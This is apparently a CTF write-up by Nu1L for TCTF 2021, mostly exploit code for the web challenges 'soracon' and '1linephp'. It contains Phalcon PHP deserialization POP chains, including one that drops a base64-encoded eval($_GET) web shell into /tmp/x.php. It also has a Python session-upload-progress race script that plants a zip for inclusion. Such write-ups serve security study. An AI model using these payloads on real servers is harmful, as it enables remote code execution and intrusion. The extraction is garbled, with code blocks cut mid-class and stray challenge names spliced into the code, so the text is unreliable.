TCTF WriteUp By Nu1L
TCTF WriteUp By Nu1L
WEB
soracon
1linephp
worldcup
Reverse
vp
FEA
lalamblambdadambda
Crypto
zer0lfsr-
checkin
PWN
listbook
how2mutate
uc_masteeer
Babyheap 2021
MISC
uc_baaaby
GutHib
welcome
singer
Survey
WEB
soracon
phpsolrint
pop chain
context = $context;
                        $this->time = $time;
                        $this->levelName = $levelName;
                        $this->message = $message;
                }
        }
}
namespace Phalcon\Logger\Formatter {
        class Line {
                public $format;
                public $dateFormat;
                public function __construct($format, $dateFormat) {
                        $this->format = $format;
                        $this->dateFormat = $dateFormat;
                }
        }
}
namespace Phalcon\Logger\Adapter {
        class Stream {
                public $name;
                public $inTransaction;
                public $mode;
                public $queue;
                public $formatter;
                public function __construct($name, $mode, $queue, $formatter) {
                        $this->inTransaction = 1;
                        $this->name = $name;
                        $this->mode = $mode;
                        $this->queue = $queue;
                        $this->formatter = $formatter;
                }
        }
}
namespace {
        $time = new DateTimeImmutable();
        $item = new Phalcon\Logger\Item([], $time, "test", "test"); 
        $line = new 
Phalcon\Logger\Formatter\Line('MTIzPD9waHAgcGhwaW5mbygpO2V2YWwoJF9HRVRbInh4Il0pOz8+', 
"Y-m-d H:i:s");
        $queue1 = [$item];
        $stream = new Phalcon\Logger\Adapter\Stream("/tmp/x.php", "w", $queue1, $line);
        $x = serialize($stream);
header('Content-Type:text/xml');
$c = '
1;i:1;' . $x . ';i:2;s:17:"a
1
2"
';
echo $c;
}
services = [$possibleService => $service, "modelsManager"=>$s2];
            $this->eventsManager = $eventsManager;
            $this->sharedInstances = [$possibleService => $evil_func_name ];
        }
    }
    class Validation{
        public function __construct($container){
            $this->container = $container;
        }
    }
}
namespace Phalcon\Events{
    class Manager{
        public $events;
        public function __construct($events){
            $this->events = $events;
            //type = di
            // eventName = beforeServiceResolve
            // events ["di"=>fireEvents(SplPriorityQueue)]
        }
    }
}
namespace Phalcon\Logger {
    class Item {
        public $context;
        public $time;
        public $levelName;
        public $message;
        public function __construct($context, $time, $levelName, $message) {
            $this->context = $context;
            $this->time = $time;
            $this->levelName = $levelName;
            $this->message = $message;
        }
    }
}
namespace Phalcon\Logger\Formatter {
    class Line {
        public $format;
        public $dateFormat;
        public function __construct($format, $dateFormat) {
            $this->format = $format;
            $this->dateFormat = $dateFormat;
        }
    }
}
namespace Phalcon\Logger\Adapter {
    class Stream {
        public $name;
        public $inTransaction;
        public $mode;
        public $queue;
        public $formatter;
        public function __construct($name, $mode, $queue, $formatter) {
            $this->inTransaction = 1;
            $this->name = $name;
            $this->mode = $mode;
            $this->queue = $queue;
            $this->formatter = $formatter;
        }
    }
}
namespace Phalcon\Di{
    class Service {
1linephp
zip26
        public $shared, $definition;
        public function __construct($shared, $definition){
            $this->shared = $shared;
            $this->definition = $definition;
        }
    }
}
namespace {
    $manager = new Phalcon\Events\Manager([]);
    $service = new Phalcon\Di\Service(false, 
['className'=>"Phalcon\Mvc\Model\Query",'arguments'=>["a"=>
["type"=>"parameter","value"=>"test"]]]);
    $s2 = new Phalcon\Di\Service(false, 
['className'=>"Phalcon\Config\Adapter\Php",'arguments'=>["a"=>
["type"=>"parameter","value"=>"php://filter/read=convert.base64-
decode/resource=/tmp/x.php"]]]);
    $di = new \Phalcon\Di("getMessage",$service,$manager,NULL,$s2);
    $time = new DateTimeImmutable();
    $item = new Phalcon\Logger\Item([], $time, "test", "test"); 
    $line = new Phalcon\Logger\Formatter\Line("this is message", "Y-m-d H:i:s");
    $queue1 = [$di];
    $stream = new Phalcon\Logger\Adapter\Stream("/tmp/test", "w", $queue1, $line);
    echo serialize($stream);
}
zip16upload_progress_16
import requests
import threading
host = 'http://111.186.59.2:50082'
PHPSESSID = 'qiyou'
def creatSession():
    while True:
        files = {
        "upload" : ("tmp.jpg", open("./1.png", "rb"))
        }
        data = {"PHP_SESSION_UPLOAD_PROGRESS" : open("./1.zip", "rb").read() }
        headers = {'Cookie':'PHPSESSID=' + PHPSESSID}
        r = requests.post(host,files = files,headers = headers,data=data)
fileName = "zip:///tmp/sess_"+PHPSESSID+"%231"
if __name__ == '__main__':
    url = "{}/index.php?yxxx={}".format(host,fileName)
    headers = {'Cookie':'PHPSESSID=' + PHPSESSID}